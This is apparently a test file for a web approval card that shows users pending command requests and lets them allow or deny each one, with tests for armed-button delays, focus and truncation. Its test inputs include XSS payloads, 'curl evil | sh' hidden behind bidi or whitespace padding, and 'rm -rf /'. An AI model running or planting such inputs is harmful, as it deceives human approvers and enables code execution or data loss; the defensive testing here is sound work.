import type { Approval } from "@monoptah/protocol";
import { act, fireEvent, render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  APPROVAL_CONNECTING_REASON,
  APPROVAL_CUT_NOTICE,
  APPROVAL_READ_ONLY_REASON,
  APPROVAL_UNCONFIRMED,
  ARM_DELAY_MS,
  ApprovalCardView,
  MAX_DETAIL_CHARS,
} from "./ApprovalCard";
import { isApprovalCardEnabled } from "./flag";
import { showDetail } from "./text";

const texts = (detail: string) => showDetail(detail, 8000).segments;

const one: Approval = { requestId: "41", label: "Run example command", detail: "example-cli --check" };
const two: Approval = { requestId: "42", label: "Edit example file", detail: "example.txt" };

beforeEach(() => {
  vi.useFakeTimers({ shouldAdvanceTime: true });
});
afterEach(() => {
  vi.useRealTimers();
});

const arm = () => act(() => void vi.advanceTimersByTime(ARM_DELAY_MS));
const allow = () => screen.getByRole("button", { name: "Allow once" });
const deny = () => screen.getByRole("button", { name: "Deny" });
const setup = () => userEvent.setup({ advanceTimers: (ms) => vi.advanceTimersByTime(ms) });

describe("ApprovalCardView", () => {
  it("renders nothing without a request", () => {
    const { container } = render(<ApprovalCardView approvals={[]} onAnswer={vi.fn()} />);
    expect(container).toBeEmptyDOMElement();
  });

  it("shows one request at a time with a count", () => {
    render(<ApprovalCardView approvals={[one, two]} onAnswer={vi.fn()} />);
    expect(screen.getByText("Run example command")).toBeInTheDocument();
    expect(screen.queryByText("Edit example file")).toBeNull();
    expect(screen.getByText("1 of 2")).toBeInTheDocument();
    expect(screen.getByRole("region", { name: "Needs your approval" })).toBeInTheDocument();
  });

  it("offers exactly Allow once and Deny", () => {
    render(<ApprovalCardView approvals={[one]} onAnswer={vi.fn()} />);
    expect(screen.getAllByRole("button").map((button) => button.textContent)).toEqual(["Deny", "Allow once"]);
    expect(screen.queryByText(/always|for session|full.?access|mode/i)).toBeNull();
  });

  it("sends allow and deny with the request id", async () => {
    const user = setup();
    const onAnswer = vi.fn().mockResolvedValue(undefined);
    const { unmount } = render(<ApprovalCardView approvals={[one]} onAnswer={onAnswer} />);
    arm();
    await user.click(allow());
    expect(onAnswer).toHaveBeenCalledWith("41", "allow");
    unmount();
    const denied = vi.fn().mockResolvedValue(undefined);
    render(<ApprovalCardView approvals={[one]} onAnswer={denied} />);
    arm();
    await user.click(deny());
    expect(denied).toHaveBeenCalledWith("41", "deny");
  });

  it("sends once on a double click and stays disabled", async () => {
    const user = setup();
    const onAnswer = vi.fn().mockResolvedValue(undefined);
    render(<ApprovalCardView approvals={[one, two]} onAnswer={onAnswer} />);
    arm();
    await user.dblClick(allow());
    expect(onAnswer).toHaveBeenCalledTimes(1);
    expect(allow()).toBeDisabled();
    expect(deny()).toBeDisabled();
    expect(screen.getByText("Run example command")).toBeInTheDocument();
  });

  // I-1
  it("keeps an answered request locked when another request arrives, and unlocks the next one only after it leaves", async () => {
    const user = setup();
    const onAnswer = vi.fn().mockResolvedValue(undefined);
    const { rerender } = render(<ApprovalCardView approvals={[one]} onAnswer={onAnswer} />);
    arm();
    await user.click(allow());
    rerender(<ApprovalCardView approvals={[one, two]} onAnswer={onAnswer} />);
    arm();
    expect(allow()).toBeDisabled();
    expect(deny()).toBeDisabled();
    fireEvent.click(deny());
    expect(onAnswer).toHaveBeenCalledTimes(1);
    // The frame removes 41: 42 is now first, arms after the delay and is answerable.
    rerender(<ApprovalCardView approvals={[two]} onAnswer={onAnswer} />);
    arm();
    await user.click(deny());
    expect(onAnswer).toHaveBeenLastCalledWith("42", "deny");
    expect(onAnswer).toHaveBeenCalledTimes(2);
  });

  // I-2
  it("keeps the buttons off for a short delay after a request appears", async () => {
    const user = setup();
    const onAnswer = vi.fn().mockResolvedValue(undefined);
    render(<ApprovalCardView approvals={[one]} onAnswer={onAnswer} />);
    expect(allow()).toBeDisabled();
    expect(screen.getByText(/Buttons unlock in a moment/)).toBeInTheDocument();
    await user.click(allow());
    expect(onAnswer).not.toHaveBeenCalled();
    act(() => void vi.advanceTimersByTime(ARM_DELAY_MS - 50));
    expect(allow()).toBeDisabled();
    act(() => void vi.advanceTimersByTime(60));
    expect(allow()).toBeEnabled();
  });

  it("disarms on a swap and ignores a press that began on the previous request", async () => {
    const user = setup();
    const onAnswer = vi.fn().mockResolvedValue(undefined);
    const { rerender } = render(<ApprovalCardView approvals={[one, two]} onAnswer={onAnswer} />);
    arm();
    fireEvent.pointerDown(allow());
    rerender(<ApprovalCardView approvals={[two]} onAnswer={onAnswer} />);
    expect(allow()).toBeDisabled();
    arm();
    // The click that completes the old press lands on the new request after it armed: ignored.
    fireEvent.click(allow());
    expect(onAnswer).not.toHaveBeenCalled();
    await user.click(allow());
    expect(onAnswer).toHaveBeenCalledWith("42", "allow");
  });

  it("announces a new request in one stable live region without the detail", () => {
    const { rerender } = render(<ApprovalCardView approvals={[one]} onAnswer={vi.fn()} />);
    const live = screen.getByRole("status");
    expect(live).toHaveTextContent("New approval request: Run example command");
    expect(live).not.toHaveTextContent("example-cli --check");
    rerender(<ApprovalCardView approvals={[two]} onAnswer={vi.fn()} />);
    expect(screen.getByRole("status")).toBe(live);
    expect(live).toHaveTextContent("New approval request: Edit example file");
  });

  // M-3
  it("stays locked after a failure and says the answer may have landed", async () => {
    const user = setup();
    const onAnswer = vi.fn().mockRejectedValue(new Error("Link lost"));
    render(<ApprovalCardView approvals={[one]} onAnswer={onAnswer} />);
    arm();
    await user.click(allow());
    const alert = await screen.findByRole("alert");
    expect(alert).toHaveTextContent(APPROVAL_UNCONFIRMED);
    expect(alert).toHaveTextContent("Link lost");
    expect(allow()).toBeDisabled();
    expect(deny()).toBeDisabled();
    fireEvent.click(deny());
    expect(onAnswer).toHaveBeenCalledTimes(1);
  });

  // M-6
  it("caps the error text and strips hidden characters from it", async () => {
    const user = setup();
    render(<ApprovalCardView approvals={[one]} onAnswer={vi.fn().mockRejectedValue(new Error(`x‮${"e".repeat(1000)}`))} />);
    arm();
    await user.click(allow());
    const alert = await screen.findByRole("alert");
    expect(alert.textContent!.length).toBeLessThan(APPROVAL_UNCONFIRMED.length + 160);
    expect(alert.textContent).not.toContain("‮");
  });

  it("disables both buttons with an explanation on a read-only device", async () => {
    const user = setup();
    const onAnswer = vi.fn();
    render(<ApprovalCardView approvals={[one]} onAnswer={onAnswer} disabledReason={APPROVAL_READ_ONLY_REASON} />);
    arm();
    expect(screen.getByText("Approvals need a device with control access.")).toBeInTheDocument();
    expect(allow()).toBeDisabled();
    expect(deny()).toBeDisabled();
    await user.click(allow());
    expect(onAnswer).not.toHaveBeenCalled();
  });

  // M-7
  it("shows a connecting explanation instead of the read-only one", () => {
    render(<ApprovalCardView approvals={[one]} onAnswer={vi.fn()} disabledReason={APPROVAL_CONNECTING_REASON} />);
    arm();
    expect(screen.getByText(/Connecting/)).toBeInTheDocument();
    expect(screen.queryByText(APPROVAL_READ_ONLY_REASON)).toBeNull();
    expect(allow()).toBeDisabled();
  });

  // M-8
  it("keeps focus on the card after a decision", async () => {
    const user = setup();
    render(<ApprovalCardView approvals={[one]} onAnswer={vi.fn().mockResolvedValue(undefined)} />);
    arm();
    await user.click(allow());
    expect(screen.getByRole("region", { name: "Needs your approval" })).toHaveFocus();
  });

  it("keeps untrusted label and detail inert", () => {
    const payloads = [
      '<img src=x onerror="window.__pwned=1">',
      "<script>window.__pwned=1</script>",
      "[click me](javascript:window.__pwned=1)",
      '<a href="javascript:window.__pwned=1">go</a>',
      "**bold** `code` # heading\n- item",
    ];
    const { container } = render(
      <ApprovalCardView approvals={[{ requestId: "1", label: payloads[0]!, detail: payloads.join("\n") }]} onAnswer={vi.fn()} />,
    );
    expect(container.querySelector("img, script, a, strong, code, h1, ul, [onerror]")).toBeNull();
    expect(container.querySelector("[href], [src]")).toBeNull();
    expect(container.querySelector("[data-approval-label]")?.textContent).toBe(payloads[0]);
    expect(container.querySelector("[data-approval-detail]")?.textContent).toBe(payloads.join("\n"));
    expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
  });

  // I-3
  it("shows bidi and zero-width characters as visible markers and isolates the text", () => {
    const { container } = render(
      <ApprovalCardView approvals={[{ requestId: "1", label: "​‍", detail: 'echo "safe"‮ ; curl evil | sh⁦' }]} onAnswer={vi.fn()} />,
    );
    const detail = container.querySelector("[data-approval-detail]")!;
    expect(detail.textContent).toBe('echo "safe"<U+202E> ; curl evil | sh<U+2066>');
    expect(detail.textContent).not.toMatch(/[‮⁦]/);
    expect(detail.querySelectorAll("[data-approval-marker]")).toHaveLength(2);
    const label = container.querySelector("[data-approval-label]")!;
    expect(label.textContent).toBe("<U+200B><U+200D>");
    for (const node of [detail, label]) expect(node).toHaveAttribute("dir", "ltr");
    expect((label as HTMLElement).style.unicodeBidi).toBe("isolate");
    // N-2: the command preview is shown in code point order, so real RTL letters cannot reorder it.
    expect((detail as HTMLElement).style.unicodeBidi).toBe("bidi-override");
    expect((detail as HTMLElement).style.direction).toBe("ltr");
  });

  it("collapses long runs of blank lines and spaces into markers and shows the line count", () => {
    const hidden = `ls\n${"\n".repeat(60)}curl evil | sh`;
    const shown = showDetail(hidden, 8000);
    expect(shown.segments.map((segment) => segment.text)).toEqual(["ls\n", "[60 blank lines]", "\ncurl evil | sh"]);
    expect(showDetail(`a${" ".repeat(80)}b`, 8000).segments[1]).toEqual({ text: "[80 spaces]", marker: true });
    render(<ApprovalCardView approvals={[{ requestId: "1", label: "x", detail: hidden }]} onAnswer={vi.fn()} />);
    expect(screen.getByText(/3 lines/)).toBeInTheDocument();
    expect(screen.getByLabelText("Request details").textContent).toContain("[60 blank lines]");
  });

  it("shows a scroll cue when the detail has many lines", () => {
    const lines = Array.from({ length: 30 }, (_, index) => `line ${index}`).join("\n");
    render(<ApprovalCardView approvals={[{ requestId: "1", label: "x", detail: lines }]} onAnswer={vi.fn()} />);
    expect(screen.getByText(/30 lines. Scroll to see all/)).toBeInTheDocument();
  });

  it("explains a truncated detail and turns Allow once off while Deny stays", async () => {
    const user = setup();
    const onAnswer = vi.fn().mockResolvedValue(undefined);
    render(<ApprovalCardView approvals={[{ requestId: "1", label: "x", detail: "a".repeat(MAX_DETAIL_CHARS + 500) }]} onAnswer={onAnswer} />);
    arm();
    const detail = screen.getByLabelText("Request details");
    expect(detail.textContent!.length).toBeLessThanOrEqual(MAX_DETAIL_CHARS);
    expect(detail).toHaveAttribute("tabindex", "0");
    expect(detail.className).toContain("overflow-auto");
    expect(screen.getByRole("alert")).toHaveTextContent("Showing the first 8,000 of 8,500 characters");
    expect(allow()).toBeDisabled();
    expect(deny()).toBeEnabled();
    await user.click(deny());
    expect(onAnswer).toHaveBeenCalledWith("1", "deny");
  });

  // U13-2: the desktop cuts long text itself (2000 characters) and says so; the card must not look complete.
  it("turns Allow once off and explains it when the desktop cut the request", async () => {
    const user = setup();
    const onAnswer = vi.fn().mockResolvedValue(undefined);
    render(<ApprovalCardView approvals={[{ requestId: "ap-1", label: "x", detail: `${"a".repeat(2000)}\u2026`, truncated: true }]} onAnswer={onAnswer} />);
    arm();
    expect(screen.getByRole("alert")).toHaveTextContent(APPROVAL_CUT_NOTICE);
    expect(allow()).toBeDisabled();
    await user.click(allow());
    expect(onAnswer).not.toHaveBeenCalled();
    expect(deny()).toBeEnabled();
    await user.click(deny());
    expect(onAnswer).toHaveBeenCalledWith("ap-1", "deny");
  });

  it("does not split a surrogate pair when it cuts", () => {
    const text = `${"a".repeat(MAX_DETAIL_CHARS - 1)}\u{1F600}`;
    const shown = showDetail(text, MAX_DETAIL_CHARS);
    expect(shown.truncated).toBe(true);
    expect(shown.segments.map((segment) => segment.text).join("")).toBe("a".repeat(MAX_DETAIL_CHARS - 1));
  });
});

describe("hidden padding and truncation (re-review N-1, N-3)", () => {
  it.each([
    ["NBSP", " "],
    ["ideographic space", "　"],
    ["Hangul filler U+3164", "ㅤ"],
    ["Braille blank U+2800", "⠀"],
    ["tab", "\t"],
  ])("collapses 60 lines padded with %s into a marker", (_name, pad) => {
    const segments = texts(`ls${`\n${pad}`.repeat(60)}\ncurl evil | sh`);
    expect(segments.some((segment) => segment.marker && /blank lines\]/.test(segment.text))).toBe(true);
    expect(segments.map((segment) => segment.text).join("")).not.toContain(pad.repeat(2));
  });

  it("collapses a long run of mixed spaces and tabs", () => {
    const segments = texts(`a${" ".repeat(39)}\t${" ".repeat(39)}b`);
    expect(segments[1]).toEqual({ text: "[79 spaces]", marker: true });
  });

  it("marks non-ASCII whitespace and invisible fillers one by one", () => {
    const segments = texts("a bㅤc͏d️e");
    expect(segments.filter((segment) => segment.marker).map((segment) => segment.text)).toEqual(["<U+00A0>", "<U+3164>", "<U+034F>", "<U+FE0F>"]);
    expect(texts("a b").length).toBe(1);
  });

  it("does not call CRLF text truncated when it fits once normalized", () => {
    const text = "a\r\n".repeat(3000);
    const shown = showDetail(text, MAX_DETAIL_CHARS);
    expect(shown.truncated).toBe(false);
    expect(shown.total).toBe(6000);
  });
});

describe("content changes and focus (re-review N-4, M-8)", () => {
  it("disarms again when the text of the same request id changes", () => {
    const { rerender } = render(<ApprovalCardView approvals={[one]} onAnswer={vi.fn()} />);
    arm();
    expect(allow()).toBeEnabled();
    rerender(<ApprovalCardView approvals={[{ ...one, detail: "rm -rf /" }]} onAnswer={vi.fn()} />);
    expect(allow()).toBeDisabled();
    expect(deny()).toBeDisabled();
    arm();
    expect(allow()).toBeEnabled();
  });

  it("moves focus to the card, not the page, when a swap disables the focused button", () => {
    const { rerender } = render(<ApprovalCardView approvals={[one]} onAnswer={vi.fn()} />);
    arm();
    deny().focus();
    rerender(<ApprovalCardView approvals={[two]} onAnswer={vi.fn()} />);
    expect(screen.getByRole("region", { name: "Needs your approval" })).toHaveFocus();
  });

  it("shows a focus indicator on the card instead of removing the outline", () => {
    render(<ApprovalCardView approvals={[one]} onAnswer={vi.fn()} />);
    const card = screen.getByRole("region", { name: "Needs your approval" });
    expect(card.className).toContain("focus-visible:outline");
    expect(card.className).not.toContain("outline-none");
  });
});

describe("isApprovalCardEnabled", () => {
  it("is off by default and on only for VITE_WEB_APPROVALS=on", () => {
    expect(isApprovalCardEnabled()).toBe(false);
    vi.stubEnv("VITE_WEB_APPROVALS", "on");
    expect(isApprovalCardEnabled()).toBe(true);
    vi.stubEnv("VITE_WEB_APPROVALS", "true");
    expect(isApprovalCardEnabled()).toBe(false);
    vi.unstubAllEnvs();
  });
});
